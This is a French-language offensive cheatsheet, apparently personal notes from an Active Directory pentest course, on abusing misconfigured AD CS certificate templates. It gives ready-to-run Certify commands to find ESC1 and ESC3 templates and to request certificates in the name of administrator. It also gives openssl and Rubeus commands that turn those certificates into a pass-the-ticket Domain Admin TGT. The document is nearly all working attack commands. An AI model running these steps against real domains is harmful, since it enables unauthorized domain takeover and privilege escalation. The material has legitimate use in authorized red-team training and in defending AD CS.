# Cheatsheet - AD CS et certificats

> [!summary] Objectif
> Trouver un template de certificat mal configuré et l'abuser pour obtenir un certificat utilisable comme DA/EA — le certificat sert ensuite à demander un TGT (`Rubeus asktgt /certificate:`), sans jamais connaître de mot de passe.

> [!abstract] Pourquoi · Chaînage
> **Repérer** un template vulnérable (ESC1/ESC3) = flag · **Exploiter** = cert au nom d'Administrator → TGT → DA/EA, sans mot de passe.
> **Prérequis** droits d'enrôlement (souvent Domain Users) → **débloque** DA/EA.

### Enumerate CA and templates

```powershell
C:\AD\Tools\Certify.exe cas
C:\AD\Tools\Certify.exe find
C:\AD\Tools\Certify.exe find /vulnerable
```

### ESC1 — enrollee supplies subject (SAN arbitraire)

> Permet à n'importe quel Domain User de demander un certificat *au nom de* `administrator` (SAN choisi librement) puis de l'échanger contre un TGT — accès Domain/Enterprise Admin complet, sans jamais connaître son mot de passe.

> [!warning]- Required
> Droits d'enrôlement sur le template vulnérable — généralement ouverts à `Domain Users` par défaut : aucun privilège au-delà d'un compte de domaine classique.

```powershell
C:\AD\Tools\Certify.exe find /enrolleeSuppliesSubject
C:\AD\Tools\Certify.exe request /ca:<CA> /template:"HTTPSCertificates" /altname:administrator
```

### ESC3 — Enrollment Agent (abus en 2 temps)

> Donne le même résultat qu'ESC1 (certificat puis TGT au nom de n'importe qui, dont Administrator) mais via un détour : un premier template ouvert à Domain Users accorde le droit de signer des demandes « on behalf of » sur un second template d'authentification — deux droits anodins pris séparément, un ESC1 complet une fois combinés.

> [!warning]- Required
> Droits d'enrôlement sur le template "Agent" (souvent ouvert à `Domain Users`) + droits d'enrôlement sur le second template ciblé par `/onbehalfof` — deux prérequis bas, cumulés pour la première fois par cette technique.

```powershell
# 1. obtenir un cert "Certificate Request Agent" (dispo à Domain Users)
C:\AD\Tools\Certify.exe request /ca:<CA> /template:SmartCardEnrollment-Agent
# 2. utiliser ce cert pour demander, au nom d'un autre user, un cert client-auth
C:\AD\Tools\Certify.exe request /ca:<CA> /template:SmartCardEnrollment-Users /onbehalfof:<DOMAIN>\administrator /enrollcert:esc3-agent.pfx /enrollcertpw:<PW>
```

### Convert PEM to PFX and use with Rubeus

```powershell
C:\AD\Tools\openssl\openssl.exe pkcs12 -in esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out esc1-DA.pfx
Rubeus.exe asktgt /user:administrator /certificate:esc1-DA.pfx /password:<PW> /ptt
```

**Link**
- [[Synthèse - AD CS]]
- [[Cheatsheet - Trusts et forêts]]
- [[Cheatsheet - Tickets Kerberos]]
- [[Attaques AD - MOC]]
